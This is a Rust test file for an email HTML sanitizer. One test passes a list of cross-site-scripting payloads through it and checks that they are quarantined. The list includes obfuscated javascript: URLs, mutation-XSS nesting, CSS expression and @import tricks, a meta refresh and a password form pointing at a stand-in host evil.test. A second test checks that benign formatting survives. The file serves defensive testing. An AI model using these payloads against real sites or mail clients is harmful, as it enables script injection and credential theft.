use mw_sanitize::{SanitizeOptions, sanitize_email_html, sanitize_email_html_reader};

#[test]
fn quarantines_active_and_obfuscated_html_without_loadable_references() {
    for payload in [
        "<script>alert(1)</script>",
        "<IMG SRC=https://evil.test/x OnError=alert(1)>",
        "<iframe srcdoc='&lt;script&gt;evil()&lt;/script&gt;'></iframe>",
        "<a href='java&#x09;script&#58;alert(1)'>click</a>",
        "<a href='&#106;avascript:alert(1)'>click</a>",
        "<a href='data:text/html,evil'>click</a>",
        "<img srcset='https://safe.test/a 1x,jav&#x61;script:evil 2x'>",
        "<svg><a xlink:href='javascript:evil()'>x</a></svg>",
        "<math><mtext><table><mglyph><style><!--</style><img title='--><img src=x onerror=evil()>'>",
        "<meta http-equiv=refresh content='0;url=https://evil.test'>",
        "<div style='width: e\\78pression(alert(1))'>text</div>",
        "<style>@\\69mport url(https://evil.test/x);</style>",
        "<div style='background: url(j\\61vascript:evil)'>text</div>",
        "<form action=https://evil.test><input name=password></form>",
        "<pre data-mw-body-blocked=false>forged</pre>",
    ] {
        for options in [SanitizeOptions::READER, SanitizeOptions::STRIP] {
            let html = format!("<p>Keep this message</p>{payload}<img src=https://images.test/x>");
            let out = sanitize_email_html_reader(&html, &options);
            assert!(
                out.starts_with("<pre data-mw-body-blocked=\"true\">"),
                "{payload}: {out}"
            );
            assert!(out.contains("Keep this message"), "{out}");
            assert!(
                !out.contains("<img") && !out.contains("<script") && !out.contains("<a "),
                "{out}"
            );
            assert!(
                !out.contains("data-mw-rc") && !out.contains("mw-rc:"),
                "{out}"
            );
            assert_eq!(out.matches("data-mw-body-blocked=").count(), 1, "{out}");
        }
    }
}

#[test]
fn preserves_benign_formatting_remote_policy_and_generic_compose_behavior() {
    let input = "<html><head><meta charset=utf-8><title>A message</title><style>p { color: red; }</style></head><body><p>Hello <strong>friend</strong> &lt;script&gt;sample&lt;/script&gt;</p><img src=https://images.test/logo.png><a href=https://example.test/>Read</a></body></html>";
    let out = sanitize_email_html_reader(input, &SanitizeOptions::READER);
    assert!(!out.contains("data-mw-body-blocked"), "{out}");
    assert!(out.contains("<strong>friend</strong>"), "{out}");
    assert!(out.contains("mw-rc:"), "{out}");
    let compose = sanitize_email_html("<p>Hello</p><script>evil()</script>");
    assert!(!compose.contains("data-mw-body-blocked"));
    assert!(compose.contains("<p>Hello</p>"));
}
